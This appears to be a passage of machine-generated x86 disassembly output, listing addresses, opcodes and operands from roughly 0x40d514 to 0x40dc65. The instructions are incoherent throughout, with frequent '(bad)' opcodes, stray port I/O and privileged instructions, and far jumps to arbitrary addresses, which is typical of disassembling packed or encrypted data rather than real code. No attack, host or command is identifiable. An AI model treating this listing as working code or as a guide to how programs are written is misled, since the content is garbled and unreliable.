  40d514:	xchg   edx,eax
  40d515:	inc    ebp
  40d516:	test   al,0xdd
  40d518:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d519:	lds    edi,FWORD PTR [edi-0x27493c5d]
  40d51f:	and    eax,0xca06a558
  40d524:	stc    
  40d525:	dec    esp
  40d526:	scas   al,BYTE PTR es:[edi]
  40d527:	inc    ebp
  40d528:	add    edi,DWORD PTR [eax+0x7a]
  40d52b:	cmp    DWORD PTR [edx-0x68],ebp
  40d52e:	inc    esp
  40d52f:	retf   0x6a15
  40d532:	push   edi
  40d533:	add    ch,BYTE PTR [ebx-0x7611e257]
  40d539:	repnz and DWORD PTR [esi-0x279659e9],ebx
  40d540:	fst    DWORD PTR [esi-0x6d]
  40d543:	cmp    al,0xb4
  40d545:	pusha  
  40d546:	pop    esp
  40d547:	das    
  40d548:	xor    al,0xd7
  40d54a:	jne    0x40d55f
  40d54c:	clc    
  40d54d:	or     al,0x29
  40d54f:	add    ah,BYTE PTR [ecx]
  40d551:	mov    bl,0x5f
  40d553:	aam    0x88
  40d555:	sub    BYTE PTR gs:[ebx],cl
  40d558:	scas   eax,DWORD PTR es:[edi]
  40d559:	adc    edx,eax
  40d55b:	sti    
  40d55c:	or     BYTE PTR [edi],cl
  40d55e:	pop    eax
  40d55f:	rcl    BYTE PTR ds:0xcb545a64,1
  40d565:	ss pop edx
  40d567:	or     al,0x56
  40d569:	retf   0xa5fd
  40d56c:	loop   0x40d546
  40d56e:	cmp    al,0xd
  40d570:	lock adc eax,0x84911481
  40d576:	loopne 0x40d538
  40d578:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d579:	cwde   
  40d57a:	jb     0x40d552
  40d57c:	cld    
  40d57d:	pusha  
  40d57e:	inc    ecx
  40d57f:	aas    
  40d580:	sbb    ah,BYTE PTR [edi-0x50]
  40d583:	in     al,0xc3
  40d585:	sbb    al,0xfe
  40d587:	test   DWORD PTR [edx+0x70],edx
  40d58a:	mov    eax,ds:0x3237cb44
  40d58f:	ror    DWORD PTR [edi-0x7f8abb52],0x13
  40d596:	cli    
  40d597:	add    DWORD PTR [ecx],eax
  40d599:	imul   esi,edi,0xffffff9b
  40d59c:	mov    WORD PTR ss:[eax],cs
  40d59f:	bound  edx,QWORD PTR [ecx+0x2]
  40d5a2:	sub    DWORD PTR [ebx-0x667d3597],edx
  40d5a8:	inc    esp
  40d5a9:	dec    eax
  40d5aa:	dec    ebx
  40d5ab:	mov    ebp,0x8bf6686
  40d5b0:	jo     0x40d544
  40d5b2:	adc    BYTE PTR [eax-0x152d7f9a],0xdc
  40d5b9:	or     eax,0x24e4490e
  40d5be:	dec    ebp
  40d5bf:	mov    dl,0x4a
  40d5c1:	xlat   BYTE PTR ds:[ebx]
  40d5c2:	mov    DWORD PTR [ecx],edx
  40d5c4:	and    eax,0xd3d00c6e
  40d5c9:	stc    
  40d5ca:	push   es
  40d5cb:	push   eax
  40d5cc:	push   edx
  40d5cd:	pop    ebx
  40d5ce:	and    eax,0x10cc25a2
  40d5d3:	mov    ch,0xb9
  40d5d5:	out    0x48,eax
  40d5d7:	sub    BYTE PTR [ecx],cl
  40d5d9:	xchg   esi,eax
  40d5da:	popf   
  40d5db:	mov    ds:0x335fd002,eax
  40d5e0:	inc    edi
  40d5e1:	outs   dx,BYTE PTR ds:[esi]
  40d5e2:	cmp    eax,0x28a44f75
  40d5e7:	push   0x7efebf2e
  40d5ec:	inc    edi
  40d5ed:	jmp    0x498f379e
  40d5f2:	mov    WORD PTR [edx-0x1548a4a5],fs
  40d5f8:	or     bh,ch
  40d5fa:	xchg   edi,eax
  40d5fb:	or     ecx,eax
  40d5fd:	jnp    0x40d611
  40d5ff:	and    al,0x96
  40d601:	sbb    edx,ebx
  40d603:	lahf   
  40d604:	or     eax,0x248ace07
  40d609:	inc    BYTE PTR [eax]
  40d60b:	mov    dl,0x25
  40d60d:	jle    0x40d616
  40d60f:	cmp    cl,cl
  40d611:	shl    edx,cl
  40d613:	inc    edx
  40d614:	hlt    
  40d615:	adc    DWORD PTR [eax],ecx
  40d617:	and    al,0x1f
  40d619:	xor    eax,0xdb5c3346
  40d61e:	mov    dh,0x87
  40d620:	std    
  40d621:	pop    ds
  40d622:	mov    eax,0x62dc387c
  40d627:	ret    
  40d628:	pop    ecx
  40d629:	jae    0x40d65d
  40d62b:	mov    al,0x95
  40d62d:	ror    cl,1
  40d62f:	jecxz  0x40d693
  40d631:	sub    eax,DWORD PTR ds:0x64481073
  40d637:	sub    ah,BYTE PTR [edx+0x381f9ea0]
  40d63d:	push   ss
  40d63e:	mov    bl,0x93
  40d640:	and    DWORD PTR [esi+0x59],esi
  40d643:	(bad)  
  40d644:	into   
  40d645:	ffree  st(2)
  40d647:	mov    dl,0x5a
  40d649:	mov    ah,0x15
  40d64b:	mov    ebx,0x6dfc8a13
  40d650:	nop
  40d651:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d652:	repz repz icebp 
  40d655:	push   edi
  40d656:	aaa    
  40d657:	mov    ds:0x3182b6bf,al
  40d65c:	(bad)  ds:0x6a8416c7
  40d662:	clc    
  40d663:	sbb    DWORD PTR [eax+edi*2-0x12413515],ebx
  40d66a:	xchg   BYTE PTR ds:[edx],ch
  40d66d:	outs   dx,BYTE PTR ds:[esi]
  40d66e:	setp   BYTE PTR [edi]
  40d671:	mov    al,ds:0x929bc815
  40d676:	push   ecx
  40d677:	and    eax,0xfdb64c1a
  40d67c:	xchg   esi,eax
  40d67d:	stos   BYTE PTR es:[edi],al
  40d67e:	es ret 
  40d680:	in     eax,dx
  40d681:	jo     0x40d69f
  40d683:	nop
  40d684:	mov    ds:0x2e8d492d,al
  40d689:	or     eax,0x64
  40d68c:	dec    edi
  40d68d:	or     dl,BYTE PTR [ebx]
  40d68f:	repz pop es
  40d691:	lea    esp,[eax-0xb7ee8bc]
  40d697:	xchg   ebx,eax
  40d698:	mov    esp,0x15ccc0e0
  40d69d:	dec    esp
  40d69e:	xor    BYTE PTR [esi-0x6a],bl
  40d6a1:	ja     0x40d6c4
  40d6a3:	(bad)  
  40d6a4:	(bad)  
  40d6a5:	push   esp
  40d6a6:	push   cs
  40d6a7:	sbb    BYTE PTR [ebx+0x58cb028a],0xdd
  40d6ae:	or     ebp,DWORD PTR [edx+0x4]
  40d6b1:	ins    BYTE PTR es:[edi],dx
  40d6b2:	cmp    DWORD PTR [eax],edi
  40d6b4:	sub    esi,DWORD PTR [ebp-0x6e]
  40d6b7:	shr    DWORD PTR [ecx],cl
  40d6b9:	std    
  40d6ba:	jmp    0x904bf998
  40d6bf:	fisub  DWORD PTR [ebx+0x28]
  40d6c2:	into   
  40d6c3:	je     0x40d72c
  40d6c5:	add    ebx,DWORD PTR [ecx-0x35bbf6a9]
  40d6cb:	pop    eax
  40d6cc:	scas   eax,DWORD PTR es:[edi]
  40d6cd:	pop    ds
  40d6ce:	inc    ecx
  40d6cf:	mov    esi,0x3b1d86be
  40d6d4:	sahf   
  40d6d5:	in     al,dx
  40d6d6:	push   ecx
  40d6d7:	xchg   ebx,eax
  40d6d8:	push   cs
  40d6d9:	mov    dh,BYTE PTR [eax+0x17]
  40d6dc:	pop    edi
  40d6dd:	lods   eax,DWORD PTR ds:[esi]
  40d6de:	in     eax,dx
  40d6df:	jge    0x40d673
  40d6e1:	sti    
  40d6e2:	push   0x421820df
  40d6e7:	rcr    BYTE PTR [esi-0x21],1
  40d6ea:	popa   
  40d6eb:	adc    ah,BYTE PTR [ebx+ebx*2+0x22]
  40d6ef:	sub    eax,0xf8ceb3ad
  40d6f4:	dec    ecx
  40d6f5:	xchg   esp,eax
  40d6f6:	das    
  40d6f7:	push   ss
  40d6f8:	ss or  eax,0x25d704a3
  40d6fe:	daa    
  40d6ff:	push   0x9cff6d6f
  40d704:	loope  0x40d6bf
  40d706:	aam    0xf5
  40d708:	or     ah,0x4c
  40d70b:	int3   
  40d70c:	or     cl,BYTE PTR [esi-0x45fd770d]
  40d712:	mov    cl,0x5b
  40d714:	popf   
  40d715:	jmp    0x40d792
  40d717:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d718:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d719:	sti    
  40d71a:	dec    esp
  40d71b:	ds mov ch,0x11
  40d71e:	hlt    
  40d71f:	sub    al,0x72
  40d721:	sbb    esi,esp
  40d723:	push   es
  40d724:	leave  
  40d725:	add    al,0x9d
  40d727:	cmp    BYTE PTR [edi],0x40
  40d72a:	pusha  
  40d72b:	(bad)  
  40d72c:	enter  0xc1cd,0xe4
  40d730:	mov    DWORD PTR [ebp+0x52],esp
  40d733:	arpl   WORD PTR [ebx-0x7],sp
  40d736:	fcomp  QWORD PTR [edi]
  40d738:	stos   BYTE PTR es:[edi],al
  40d739:	(bad)  
  40d73a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d73b:	dec    esi
  40d73c:	cmp    dh,BYTE PTR [eax]
  40d73e:	aas    
  40d73f:	sub    ebp,esp
  40d741:	push   es
  40d742:	or     bl,BYTE PTR [esi-0x68]
  40d745:	scas   eax,DWORD PTR es:[edi]
  40d746:	jmp    0x6a9998ca
  40d74b:	push   0xffffffe7
  40d74d:	sub    ecx,DWORD PTR [ebp+0x72]
  40d750:	xor    dl,BYTE PTR [edx]
  40d752:	add    al,0xce
  40d754:	cmc    
  40d755:	je     0x40d740
  40d757:	mov    al,0xb
  40d759:	sbb    BYTE PTR [eax],al
  40d75b:	jae    0x40d714
  40d75d:	cmp    BYTE PTR [ebx+ecx*4-0x52f0352a],cl
  40d764:	iret   
  40d765:	mov    ebx,0x3e5e56bd
  40d76a:	fadd   QWORD PTR [eax]
  40d76c:	aaa    
  40d76d:	sbb    eax,0xe8e10b46
  40d772:	into   
  40d773:	div    BYTE PTR [ecx+edi*8]
  40d776:	adc    edx,DWORD PTR [edx]
  40d778:	lods   al,BYTE PTR ds:[esi]
  40d779:	push   cs
  40d77a:	test   eax,0x28c22091
  40d77f:	lods   al,BYTE PTR ds:[esi]
  40d780:	fld    DWORD PTR [ebx+0x271159df]
  40d786:	fstp   QWORD PTR [eax+ebp*1]
  40d789:	jnp    0x40d71e
  40d78b:	xchg   ebx,eax
  40d78c:	sahf   
  40d78d:	out    0xd,al
  40d78f:	rcr    esp,0x7c
  40d792:	inc    ebp
  40d793:	push   ebx
  40d794:	or     DWORD PTR [edx-0x1f1a315c],esi
  40d79a:	mov    ds:0xd8f3f3dd,al
  40d79f:	outs   dx,DWORD PTR ds:[esi]
  40d7a0:	jb     0x40d784
  40d7a2:	mov    dl,0x55
  40d7a4:	and    dl,BYTE PTR [edi-0x5061b98f]
  40d7aa:	inc    esi
  40d7ab:	push   esi
  40d7ac:	into   
  40d7ad:	fmul   QWORD PTR [esi-0x44]
  40d7b0:	call   0x6eca60f6
  40d7b5:	adc    esi,0x59f88fd9
  40d7bb:	(bad)  
  40d7bc:	das    
  40d7bd:	packssdw mm6,mm1
  40d7c0:	daa    
  40d7c1:	imul   edx,DWORD PTR [edx+0x13363705],0x67
  40d7c8:	push   ss
  40d7c9:	pop    eax
  40d7ca:	xchg   edx,eax
  40d7cb:	(bad)  ds:0x95b6a007
  40d7d1:	pop    esi
  40d7d2:	rcl    ah,0xf8
  40d7d5:	stos   DWORD PTR es:[edi],eax
  40d7d6:	outs   dx,BYTE PTR ds:[esi]
  40d7d7:	dec    esi
  40d7d8:	push   0xffffffed
  40d7da:	addr16 mov eax,ds:0x559f
  40d7de:	scas   eax,DWORD PTR es:[edi]
  40d7df:	adc    eax,0xb074da2c
  40d7e4:	xchg   edx,eax
  40d7e5:	cmp    DWORD PTR [edi],esi
  40d7e7:	add    DWORD PTR [eax],ecx
  40d7e9:	xchg   esp,eax
  40d7ea:	add    eax,0xc369015c
  40d7ef:	adc    DWORD PTR [ebx],ebx
  40d7f1:	inc    esi
  40d7f2:	sub    BYTE PTR [edi],bl
  40d7f4:	mov    esi,0x6dcb3c42
  40d7f9:	inc    esp
  40d7fa:	ins    BYTE PTR es:[edi],dx
  40d7fb:	in     eax,0x57
  40d7fd:	inc    ebp
  40d7fe:	fsub   QWORD PTR [edi]
  40d800:	mov    dh,0x5b
  40d802:	enter  0xe996,0xd1
  40d806:	repz mov ah,0x9a
  40d809:	leave  
  40d80a:	or     DWORD PTR ds:0xf4be0b86,eax
  40d810:	sbb    DWORD PTR [ebx+0x7991ae39],0x595e5d84
  40d81a:	xchg   edi,eax
  40d81b:	repnz (bad) 
  40d81d:	and    eax,0xf3a7989d
  40d822:	shl    DWORD PTR [ebp-0x37a7664c],1
  40d828:	mov    ebx,0x8a680e7e
  40d82d:	inc    ebp
  40d82e:	test   eax,0x4ed66d7f
  40d833:	pop    ebx
  40d834:	lods   eax,DWORD PTR ds:[esi]
  40d835:	test   BYTE PTR [eax-0x5849a630],dh
  40d83b:	push   ecx
  40d83c:	sub    esi,DWORD PTR [eax]
  40d83e:	push   ss
  40d83f:	push   ds
  40d840:	out    dx,al
  40d841:	fwait
  40d842:	inc    eax
  40d843:	xor    al,0x63
  40d845:	xchg   esp,eax
  40d846:	lods   eax,DWORD PTR ds:[esi]
  40d847:	retf   
  40d848:	jge    0x40d89b
  40d84a:	sub    DWORD PTR [eax],edx
  40d84c:	in     eax,dx
  40d84d:	push   ebp
  40d84e:	sub    DWORD PTR [edx+0x41b7622f],edx
  40d854:	shl    eax,1
  40d856:	xchg   BYTE PTR [ebp+0x70305e19],ch
  40d85c:	test   ecx,ebx
  40d85e:	sbb    DWORD PTR [edi+0x1941fe07],esi
  40d864:	data16 loopne 0x40d7fe
  40d867:	lods   al,BYTE PTR ds:[esi]
  40d868:	adc    cl,dh
  40d86a:	jp     0x40d88c
  40d86c:	cmp    BYTE PTR [esi+0x1b099cb9],0x12
  40d873:	in     eax,0x44
  40d875:	daa    
  40d876:	mov    al,ds:0xc99d2dca
  40d87b:	(bad)  
  40d87d:	call   0x7c65:0xbae935e8
  40d884:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d885:	stos   BYTE PTR es:[edi],al
  40d886:	das    
  40d887:	add    eax,0x1b78c9f9
  40d88c:	cmp    ah,al
  40d88e:	and    al,BYTE PTR [edx+edi*4-0x3084c85]
  40d895:	jbe    0x40d83c
  40d897:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d898:	pop    edi
  40d899:	jne    0x40d904
  40d89b:	fist   WORD PTR [edx-0xd]
  40d89e:	test   BYTE PTR [eax],bh
  40d8a0:	push   esp
  40d8a1:	in     eax,0xe3
  40d8a3:	pop    esp
  40d8a4:	int3   
  40d8a5:	lea    esp,[edx]
  40d8a7:	dec    ebx
  40d8a8:	xchg   ebp,eax
  40d8a9:	mov    esi,0x3ded4f01
  40d8ae:	idiv   BYTE PTR [esi+0x60]
  40d8b1:	push   ebp
  40d8b2:	lds    ebx,FWORD PTR [edi-0x2b8444f9]
  40d8b8:	lahf   
  40d8b9:	(bad)  
  40d8ba:	adc    eax,0xd464806f
  40d8bf:	fist   WORD PTR [edx+0x56]
  40d8c2:	sbb    ecx,ebx
  40d8c4:	xor    eax,0xca49218
  40d8c9:	fwait
  40d8ca:	(bad)  
  40d8cb:	fwait
  40d8cc:	and    ebx,edx
  40d8ce:	pop    edi
  40d8cf:	test   al,0x5f
  40d8d1:	inc    edx
  40d8d2:	inc    ecx
  40d8d3:	ja     0x40d911
  40d8d5:	sar    BYTE PTR [ecx+edi*4],0x24
  40d8d9:	or     BYTE PTR [ecx],0x34
  40d8dc:	cmp    cl,BYTE PTR [edi-0x7c516f05]
  40d8e2:	test   BYTE PTR ds:0xd34a58cf,ah
  40d8e8:	sub    esi,esi
  40d8ea:	mov    ah,0x18
  40d8ec:	popa   
  40d8ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8ee:	(bad)  
  40d8ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8f0:	or     ebx,edx
  40d8f2:	push   ebp
  40d8f3:	dec    DWORD PTR [esi+0x50]
  40d8f6:	adc    DWORD PTR [edx+0x7eafdb9c],ebx
  40d8fc:	retf   
  40d8fd:	scas   al,BYTE PTR es:[edi]
  40d8fe:	(bad)  
  40d8ff:	adc    eax,esp
  40d901:	and    esi,DWORD PTR [ecx]
  40d903:	test   DWORD PTR [edi],eax
  40d905:	cld    
  40d906:	cmp    esp,edx
  40d908:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d909:	sbb    DWORD PTR [edx+0x184cc594],ebp
  40d90f:	jmp    0xccef2c58
  40d914:	imul   esi,DWORD PTR [edi+0x21af3238],0xffffff81
  40d91b:	icebp  
  40d91c:	jae    0x40d973
  40d91e:	inc    eax
  40d91f:	ret    0x1b2c
  40d922:	call   0x1fddfd57
  40d927:	lods   al,BYTE PTR ds:[esi]
  40d928:	das    
  40d929:	popf   
  40d92a:	jne    0x40d951
  40d92c:	or     DWORD PTR [ebp-0x2],edx
  40d92f:	aad    0xbb
  40d931:	js     0x40d8ef
  40d933:	loope  0x40d8ee
  40d935:	aad    0xf2
  40d937:	push   esp
  40d938:	retf   0xa727
  40d93b:	lahf   
  40d93c:	fistp  WORD PTR [ecx-0x4f]
  40d93f:	xchg   BYTE PTR [esi],ch
  40d941:	xchg   BYTE PTR [ecx],dl
  40d943:	inc    ecx
  40d944:	adc    al,bl
  40d946:	and    DWORD PTR [esp+ebx*1],ebx
  40d949:	lahf   
  40d94a:	lods   eax,DWORD PTR ds:[esi]
  40d94b:	fcomp  DWORD PTR [edx+0x71625804]
  40d951:	std    
  40d952:	mov    al,0xd
  40d954:	push   ss
  40d955:	stos   DWORD PTR es:[edi],eax
  40d956:	sbb    DWORD PTR [eax+edi*1+0x64],ecx
  40d95a:	dec    ecx
  40d95b:	rol    edx,cl
  40d95d:	xlat   BYTE PTR ds:[ebx]
  40d95e:	arpl   WORD PTR [esi-0x2aa1f560],bx
  40d964:	mov    cl,0xc6
  40d966:	stos   DWORD PTR es:[edi],eax
  40d967:	cwde   
  40d968:	jmp    0x40d9bb
  40d96a:	xchg   esp,eax
  40d96b:	sub    ebx,DWORD PTR [ecx]
  40d96d:	test   al,0x17
  40d96f:	sbb    ebp,DWORD PTR [edi+0x42]
  40d972:	inc    esi
  40d973:	mov    ah,0x88
  40d975:	jo     0x40d9d5
  40d977:	loopne 0x40d9ba
  40d979:	push   esi
  40d97a:	mov    edi,0x58755777
  40d97f:	sub    eax,0x5a634106
  40d984:	ja     0x40d919
  40d986:	pop    ebx
  40d987:	adc    esi,eax
  40d989:	xchg   ebx,eax
  40d98a:	xor    ebp,0xb1552092
  40d990:	cmp    eax,0xaa71e7f3
  40d995:	les    edx,FWORD PTR [ecx-0x3a]
  40d998:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d999:	pusha  
  40d99a:	lods   eax,DWORD PTR ds:[esi]
  40d99b:	js     0x40d973
  40d99d:	jmp    0x4539:0x7993ea0f
  40d9a4:	(bad)  
  40d9a5:	pop    edx
  40d9a6:	stc    
  40d9a7:	push   ecx
  40d9a8:	add    eax,0xc66c6d7d
  40d9ad:	in     eax,0xb6
  40d9af:	mov    cl,0x94
  40d9b1:	(bad)  
  40d9b2:	xor    BYTE PTR [eax+0x576aa71d],0x1f
  40d9b9:	mov    eax,?
  40d9bb:	sub    DWORD PTR [eax+esi*8],0x1ca0e15e
  40d9c2:	inc    ecx
  40d9c3:	rcl    BYTE PTR [edi+ebx*4+0x3997de86],1
  40d9ca:	in     al,dx
  40d9cb:	dec    esi
  40d9cc:	dec    ecx
  40d9cd:	sbb    DWORD PTR [ecx-0x2ef43ea1],0x92d4f98e
  40d9d7:	call   0x89ad:0xc299f931
  40d9de:	int    0xc7
  40d9e0:	jb     0x40da06
  40d9e2:	jb     0x40da0f
  40d9e4:	mov    dl,0x50
  40d9e6:	mov    ah,0xdf
  40d9e8:	adc    edx,DWORD PTR [edi]
  40d9ea:	sbb    edx,DWORD PTR [esi-0x2d220915]
  40d9f0:	popf   
  40d9f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9f2:	out    dx,eax
  40d9f3:	xchg   ecx,eax
  40d9f4:	stos   DWORD PTR es:[edi],eax
  40d9f5:	jb     0x40d9c1
  40d9f7:	in     eax,dx
  40d9f8:	xchg   edi,eax
  40d9f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9fa:	adc    bh,0x94
  40d9fd:	jg     0x40da0e
  40d9ff:	and    al,0x9
  40da01:	sub    bl,BYTE PTR [ebx-0x57]
  40da04:	bound  ecx,QWORD PTR [eax]
  40da06:	test   al,0x55
  40da08:	out    0xab,eax
  40da0a:	call   0xbc71:0x533a4a57
  40da11:	push   esp
  40da12:	loop   0x40da2d
  40da14:	lock enterw 0x90d1,0xbd
  40da1a:	push   cs
  40da1b:	inc    esp
  40da1c:	lods   eax,DWORD PTR ds:[esi]
  40da1d:	xor    eax,ecx
  40da1f:	sub    eax,DWORD PTR [ebx+0xf2f6288]
  40da25:	neg    DWORD PTR [edx]
  40da27:	test   esi,ebp
  40da29:	push   ss
  40da2a:	push   cs
  40da2b:	xor    ah,bh
  40da2d:	fisub  DWORD PTR [edi-0x4c928e46]
  40da33:	cli    
  40da34:	stos   BYTE PTR es:[edi],al
  40da35:	repnz out dx,al
  40da37:	mov    esi,0xfd7a2e71
  40da3c:	jge    0x40da76
  40da3e:	inc    edx
  40da3f:	test   BYTE PTR [esi],bl
  40da41:	dec    edx
  40da42:	test   al,0x20
  40da44:	mov    bh,0x48
  40da46:	shl    BYTE PTR [edi],0xbb
  40da49:	mov    ecx,0x41d8ada0
  40da4e:	and    eax,eax
  40da50:	sbb    al,cl
  40da52:	ins    DWORD PTR es:[edi],dx
  40da53:	and    DWORD PTR [ebx+0x2c86b8b3],edx
  40da59:	mov    ebx,0xc8773530
  40da5e:	jl     0x40dabe
  40da60:	mov    eax,ds:0x9de9d443
  40da65:	cmc    
  40da66:	retf   0xcb0
  40da69:	pop    ds
  40da6a:	mov    bl,0xf5
  40da6c:	(bad)  
  40da6d:	mov    cl,0xd
  40da6f:	(bad)  
  40da70:	xchg   esi,eax
  40da71:	xor    BYTE PTR ds:0xbbb1e333,0x26
  40da78:	add    eax,0xa7046edb
  40da7d:	mov    eax,0x6a962caf
  40da82:	(bad)  
  40da83:	call   DWORD PTR [esi]
  40da85:	push   ecx
  40da86:	dec    edi
  40da87:	inc    edx
  40da88:	inc    ebp
  40da89:	pop    edi
  40da8a:	add    dh,BYTE PTR [esi]
  40da8c:	rcl    BYTE PTR [edi-0x55f61419],0x2f
  40da93:	aas    
  40da94:	jae    0x40da2b
  40da96:	clc    
  40da97:	add    DWORD PTR [ebx-0x70],edx
  40da9a:	into   
  40da9b:	xchg   ebx,eax
  40da9c:	or     BYTE PTR [ebp+ebx*2+0x15],ch
  40daa0:	or     eax,0x4617c2b
  40daa5:	mov    bl,0xd2
  40daa7:	or     esi,DWORD PTR [ecx+0x1e]
  40daaa:	jb     0x40da65
  40daac:	enter  0xc94a,0x70
  40dab0:	outs   dx,DWORD PTR ds:[esi]
  40dab1:	push   edi
  40dab2:	out    0xec,al
  40dab4:	xchg   edx,eax
  40dab5:	inc    ebp
  40dab6:	xchg   ebp,eax
  40dab7:	add    DWORD PTR [esp+edi*4-0x5e],0x514bf92e
  40dabf:	add    BYTE PTR [ebx-0x4a],0x37
  40dac3:	ficomp DWORD PTR [esp+edi*1-0x281cf604]
  40daca:	dec    esi
  40dacb:	lahf   
  40dacc:	or     eax,0xca577f64
  40dad1:	jp     0x40dabe
  40dad3:	xor    dl,bh
  40dad5:	ja     0x40db36
  40dad7:	push   esp
  40dad8:	push   esi
  40dad9:	ret    0xf548
  40dadc:	mov    bh,0x93
  40dade:	pop    es
  40dadf:	push   esi
  40dae0:	dec    ecx
  40dae1:	call   0x995a8888
  40dae6:	mov    esp,0x49a63b71
  40daeb:	adc    edx,DWORD PTR [eax-0x77178d4b]
  40daf1:	fidivr DWORD PTR [esi-0x44606b82]
  40daf7:	or     DWORD PTR [eax+0x1],0xffffffe6
  40dafb:	adc    esi,DWORD PTR [edx+0x1c]
  40dafe:	es shl dl,0x16
  40db02:	push   ebx
  40db03:	push   edx
  40db04:	jns    0x40db4e
  40db06:	or     eax,0x54b27828
  40db0b:	(bad)  
  40db0c:	mov    al,ds:0xaa502b53
  40db11:	pop    ss
  40db12:	icebp  
  40db13:	pop    esp
  40db14:	and    eax,0x52a5ddca
  40db19:	out    dx,eax
  40db1a:	mov    edi,0xdbee680f
  40db1f:	xchg   esi,eax
  40db20:	mov    edi,0x7af1e081
  40db25:	push   es
  40db26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db27:	leave  
  40db28:	(bad)  
  40db2a:	icebp  
  40db2b:	xor    dl,BYTE PTR [eax-0x1e]
  40db2e:	(bad)  [edx]
  40db30:	and    bl,ch
  40db32:	dec    edx
  40db33:	or     ah,BYTE PTR [ebp+ebp*2-0x52]
  40db37:	mov    BYTE PTR [esi],al
  40db39:	out    0x50,eax
  40db3b:	dec    ebp
  40db3c:	add    esp,DWORD PTR [edi]
  40db3e:	pop    ds
  40db3f:	(bad)  
  40db40:	in     eax,dx
  40db41:	pop    esi
  40db42:	sub    dh,dl
  40db44:	sbb    bh,BYTE PTR [ecx+0x76f6ee2e]
  40db4a:	and    al,0x77
  40db4c:	mov    ds:0xca451a58,al
  40db51:	fsubr  DWORD PTR [edi]
  40db53:	ror    BYTE PTR [esi-0x67],cl
  40db56:	xchg   edi,eax
  40db57:	loop   0x40db7f
  40db59:	dec    esp
  40db5a:	cdq    
  40db5b:	xchg   BYTE PTR ds:0xe79e07c4,bl
  40db61:	dec    ecx
  40db62:	mov    esp,0xbca3657e
  40db67:	pop    eax
  40db68:	pushf  
  40db69:	adc    BYTE PTR [edx+0x57],bl
  40db6c:	and    BYTE PTR [eax-0x4b],ch
  40db6f:	adc    eax,0x6141db29
  40db74:	jge    0x40db23
  40db76:	jb     0x40dba9
  40db78:	inc    esp
  40db79:	and    eax,0x9452c63c
  40db7e:	jae    0x40dbd3
  40db80:	jmp    0x3b08:0x4ccb90b2
  40db87:	mov    dh,BYTE PTR [ebx+0x4f4ee8da]
  40db8d:	arpl   WORD PTR [edx+0x76d0b410],bx
  40db93:	adc    ebp,DWORD PTR [ecx-0x1]
  40db96:	cs out 0x7d,eax
  40db99:	jmp    0x7ed0:0xb26f6639
  40dba0:	push   ebp
  40dba1:	std    
  40dba2:	fistp  QWORD PTR [ecx-0x2b]
  40dba5:	aas    
  40dba6:	mov    esp,DWORD PTR [edi-0x44]
  40dba9:	sub    eax,0x92d3d547
  40dbae:	inc    eax
  40dbaf:	inc    eax
  40dbb0:	ins    DWORD PTR es:[edi],dx
  40dbb1:	pop    ecx
  40dbb2:	cld    
  40dbb3:	loopne 0x40db3f
  40dbb5:	sahf   
  40dbb6:	fcmovnbe st,st(5)
  40dbb8:	retf   0x2be2
  40dbbb:	outs   dx,BYTE PTR ds:[esi]
  40dbbc:	push   ebp
  40dbbd:	cld    
  40dbbe:	jmp    0xf5fa9aed
  40dbc3:	cmp    DWORD PTR [ecx],esp
  40dbc5:	lods   al,BYTE PTR ds:[esi]
  40dbc6:	lds    esi,FWORD PTR [ebp+0xb]
  40dbc9:	lahf   
  40dbca:	cwde   
  40dbcb:	out    0xbd,al
  40dbcd:	leave  
  40dbce:	leave  
  40dbcf:	repz sub ch,BYTE PTR [eax-0x59438cc5]
  40dbd6:	adc    BYTE PTR [eax],ah
  40dbd8:	das    
  40dbd9:	mov    edi,0xff2c3548
  40dbde:	inc    ebx
  40dbdf:	and    ebp,DWORD PTR [ebp+0x37]
  40dbe2:	and    eax,0x91bda2c1
  40dbe7:	loop   0x40dbf5
  40dbe9:	dec    edi
  40dbea:	xchg   esi,eax
  40dbeb:	push   0x9cf67629
  40dbf0:	cmp    dl,BYTE PTR [ebx+0x6e]
  40dbf3:	jmp    0x8150:0x7310db8d
  40dbfa:	js     0x40dc24
  40dbfc:	mov    al,0x38
  40dbfe:	add    ebp,DWORD PTR [edi-0x17d806f7]
  40dc04:	or     BYTE PTR [edx+esi*2],dh
  40dc07:	mov    bh,BYTE PTR [edx]
  40dc09:	add    ch,BYTE PTR [eax]
  40dc0b:	out    dx,al
  40dc0c:	push   ebx
  40dc0d:	cmp    ch,0x94
  40dc10:	adc    eax,0xf3c39936
  40dc15:	rcr    DWORD PTR [ebx+ecx*2-0x4486c897],cl
  40dc1c:	mov    bh,BYTE PTR [esi]
  40dc1e:	int    0x61
  40dc20:	mov    edi,0x1e17f93c
  40dc25:	jge    0x40dc09
  40dc27:	mov    bh,BYTE PTR [esp+eiz*4+0x61]
  40dc2b:	std    
  40dc2c:	sbb    al,0xa9
  40dc2e:	cld    
  40dc2f:	dec    esi
  40dc30:	cmp    eax,0xacae883b
  40dc35:	xor    DWORD PTR [ebx],edi
  40dc37:	popa   
  40dc38:	out    dx,eax
  40dc39:	mov    esi,0xe1c8f2a5
  40dc3e:	call   0x248f3055
  40dc43:	data16 mov cl,0x9f
  40dc46:	test   ebp,ebx
  40dc48:	adc    eax,DWORD PTR [ebp-0x6f5bc4c8]
  40dc4e:	(bad)  
  40dc4f:	gs add al,0x49
  40dc52:	bswap  edi
  40dc54:	fimul  WORD PTR [edx]
  40dc56:	push   ebx
  40dc57:	popa   
  40dc58:	xchg   ecx,eax
  40dc59:	sub    eax,0x7aaac8e2
  40dc5e:	dec    edx
  40dc5f:	addr16 jmp 0x40dc1e
  40dc62:	(bad)  
  40dc63:	sbb    al,0x2e
  40dc65:	jmp    0x9b42:0x62a7e65d
